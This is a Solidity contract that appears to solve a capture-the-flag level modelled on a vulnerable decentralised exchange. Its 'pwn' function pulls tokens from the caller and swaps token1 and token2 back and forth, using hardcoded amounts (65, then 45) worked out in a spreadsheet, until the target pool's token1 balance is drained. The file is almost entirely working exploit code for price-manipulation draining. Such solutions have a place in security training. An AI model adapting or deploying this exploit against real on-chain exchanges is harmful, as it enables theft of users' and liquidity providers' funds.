// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

error CallNotSuccess();

interface ITarget {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function approve(address spender, uint256 amount) external;

    function token1() external view returns (address);

    function token2() external view returns (address);

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract Dex {
    function pwn(address targetAddress) public {
        ITarget target = ITarget(targetAddress);
        address token1 = target.token1();
        address token2 = target.token2();
        uint256 amount;

        ITarget(token1).transferFrom(msg.sender, address(this), 10);
        ITarget(token2).transferFrom(msg.sender, address(this), 10);

        target.approve(targetAddress, 110);

        while (target.balanceOf(token1, targetAddress) != 0) {
            amount = target.balanceOf(token1, address(this));
            target.swap(token1, token2, amount);
            // 65 and 45 come from pre calculate in excel
            if (target.balanceOf(token2, address(this)) == 65) {
                amount = 45;
                // this will drain pool1 only 110 token
                target.swap(token2, token1, amount);
            } else {
                amount = target.balanceOf(token2, address(this));
                target.swap(token2, token1, amount);
            }
        }
    }
}
